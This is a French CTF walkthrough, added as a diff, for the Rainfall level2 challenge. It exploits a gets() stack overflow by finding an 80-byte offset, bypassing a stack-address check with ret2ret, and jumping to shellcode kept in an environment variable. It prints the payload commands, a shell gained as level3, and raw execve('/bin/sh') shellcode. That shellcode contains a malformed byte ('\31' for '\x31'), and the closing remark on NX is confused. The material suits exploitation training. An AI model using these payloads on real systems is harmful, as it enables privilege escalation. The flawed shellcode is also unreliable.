@@ -1,0 +1,113 @@
+# Walkthrough - Rainfall Level2 (sans GDB)
+
+## Objectif
+
+Exploiter un dépassement de tampon (buffer overflow) dans la fonction gets() pour obtenir un shell avec les droits de level3.
+
+---
+
+## 1. Analyse du Programme
+
+Le programme principal appelle simplement la fonction p() :
+
+```c
+void main(void) {
+  p();
+  return;
+}
+```
+
+La fonction p() contient la vulnérabilité :
+
+```c
+void p(void) {
+  char local_50[76];
+  fflush(stdout);
+  gets(local_50); // VULNÉRABLE
+
+  if ((retaddr & 0xb0000000) == 0xb0000000) {
+    printf("(%p)\n", retaddr);
+    _exit(1);
+  }
+
+  puts(local_50);
+  strdup(local_50);
+}
+```
+
+Le gets() permet un overflow de la pile.
+
+Il y a un check pour empêcher les retours vers la stack (0xbxxxxxxx).
+
+---
+
+## 2. Détermination de l'Offset
+
+On trouve que l'EIP est à 80 octets :
+
+```bash
+$ python -c 'print "A"*80 + "BBBB"' > payload
+$ ./level2 < payload
+# Crash avec EIP = 0x42424242 (BBBB)
+```
+
+---
+
+## 3. Contournement de la protection
+
+On ne peut pas retourner vers un shellcode dans la stack à cause du test 0xb0000000.
+
+### Solution : ret2ret + shellcode en variable d'environnement
+
+Créer un shellcode avec NOP sled dans une variable d'env :
+
+```bash
+env -i exploit=$(python -c 'print "\x90"*1000 + "<shellcode>"') ./level2
+```
+
+Trouver une adresse dans le NOP sled (ex: 0xbffffeaa)
+
+Trouver une adresse d'instruction ret (ex: 0x0804854b)
+
+Construire le payload :
+
+```bash
+python -c 'print "A"*80 + "\x4b\x85\x04\x08" + "\xaa\xfe\xff\xbf"' > /tmp/exploit
+```
+
+Exécution de l'exploit :
+
+```bash
+cat /tmp/exploit - | env -i exploit=$(python -c 'print "\x90"*1000 + "<shellcode>"') ./level2
+```
+
+Succès :
+
+```bash
+whoami
+level3
+```
+
+---
+
+## 4. Détails Techniques
+
+- **ret2ret** : Technique consistant à chaîner deux retours pour sauter la vérification.
+- **NOP sled** : Zone de \x90 pour atterrir facilement sur le shellcode.
+- **Variable d'environnement** : permet de stocker un shellcode sans toucher la stack.
+
+---
+
+## 5. Shellcode utilisé
+
+```bash
+\x31\xc0\31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+Il ré-ouvre stdin puis appelle execve("/bin/sh").
+
+---
+
+## Conclusion
+
+Level2 est une excellente démo de contournement de protection basique via ret2ret, avec injection de shellcode dans les variables d'environnement. Cette technique reste efficace tant que l'ASLR est désactivé et que NX n'empêche pas le code dans les segments non-exécutables.
